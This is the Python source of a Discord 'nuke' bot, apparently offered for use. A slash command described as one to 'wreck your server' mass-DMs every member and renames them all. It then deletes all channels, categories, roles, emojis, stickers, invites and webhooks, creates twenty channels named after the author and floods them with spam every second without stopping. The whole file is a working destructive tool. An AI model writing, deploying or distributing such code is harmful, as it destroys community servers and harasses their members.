import discord
from discord import app_commands
from discord.ext import commands
import asyncio

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.tree.command(name="start", description="This command will wreck your server and annoy everyone")
@app_commands.describe(message="Message to send every 1 second and via DM")
async def start(interaction: discord.Interaction, message: str):
    await interaction.response.send_message("Starting...", ephemeral=True)
    guild = interaction.guild

    for member in guild.members:
        if member.bot: continue
        try:
            await member.send(message)
            print(f"DEBUG: Sent DM to {member.name}")
        except Exception as e:
            print(f"ERROR: Cannot DM {member.name}: {e}")

    for member in guild.members:
        if member.bot: continue
        try:
            await member.edit(nick="nuked by tapetenputzer")
            print(f"DEBUG: Renamed {member.name}")
        except Exception as e:
            print(f"ERROR: Cannot rename {member.name}: {e}")

    print("DEBUG: Deleting channels with throttle")
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"DEBUG: Deleted channel {channel.name}")
        except Exception as e:
            print(f"ERROR: Cannot delete channel {channel.name}: {e}")
        await asyncio.sleep(0.5)

    print("DEBUG: Deleting categories with throttle")
    for category in guild.categories:
        try:
            await category.delete()
            print(f"DEBUG: Deleted category {category.name}")
        except Exception as e:
            print(f"ERROR: Cannot delete category {category.name}: {e}")
        await asyncio.sleep(0.5)

    print("DEBUG: Deleting roles with throttle")
    for role in guild.roles:
        if role.is_default(): continue
        try:
            await role.delete()
            print(f"DEBUG: Deleted role {role.name}")
        except Exception as e:
            print(f"ERROR: Cannot delete role {role.name}: {e}")
        await asyncio.sleep(0.5)

    print("DEBUG: Deleting emojis with throttle")
    for emoji in guild.emojis:
        try:
            await emoji.delete()
            print(f"DEBUG: Deleted emoji {emoji.name}")
        except Exception as e:
            print(f"ERROR: Cannot delete emoji {emoji.name}: {e}")
        await asyncio.sleep(0.5)

    print("DEBUG: Deleting stickers with throttle")
    for sticker in guild.stickers:
        try:
            await sticker.delete()
            print(f"DEBUG: Deleted sticker {sticker.name}")
        except Exception as e:
            print(f"ERROR: Cannot delete sticker {sticker.name}: {e}")
        await asyncio.sleep(0.5)

    print("DEBUG: Deleting invites with throttle")
    try:
        for invite in await guild.invites():
            try:
                await invite.delete()
                print(f"DEBUG: Deleted invite {invite.code}")
            except Exception as e:
                print(f"ERROR: Cannot delete invite {invite.code}: {e}")
            await asyncio.sleep(0.5)
    except Exception as e:
        print(f"ERROR: Cannot fetch invites: {e}")

    print("DEBUG: Deleting webhooks with throttle")
    for text_channel in guild.text_channels:
        try:
            hooks = await text_channel.webhooks()
            for hook in hooks:
                try:
                    await hook.delete()
                    print(f"DEBUG: Deleted webhook {hook.id} in {text_channel.name}")
                except Exception as e:
                    print(f"ERROR: Cannot delete webhook {hook.id}: {e}")
                await asyncio.sleep(0.5)
        except Exception as e:
            print(f"ERROR: Cannot fetch webhooks in {text_channel.name}: {e}")

    new_channels = []
    async def spam_loop():
        while True:
            for chan in new_channels:
                try:
                    await chan.send(message)
                    print(f"DEBUG: Sent to {chan.name}: {message}")
                except Exception as e:
                    print(f"ERROR: Cannot send to {chan.name}: {e}")
            await asyncio.sleep(1)

    bot.loop.create_task(spam_loop())

    print("DEBUG: Creating Tapetenputzer channels with throttle")
    for i in range(20):
        try:
            chan = await guild.create_text_channel(f"Tapetenputzer-{i+1}")
            new_channels.append(chan)
            print(f"DEBUG: Created channel {chan.name}")
        except Exception as e:
            print(f"ERROR: Cannot create channel Tapetenputzer-{i+1}: {e}")
        await asyncio.sleep(0.5)

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"DEBUG: Ready as {bot.user}")

bot.run("Bot Token")
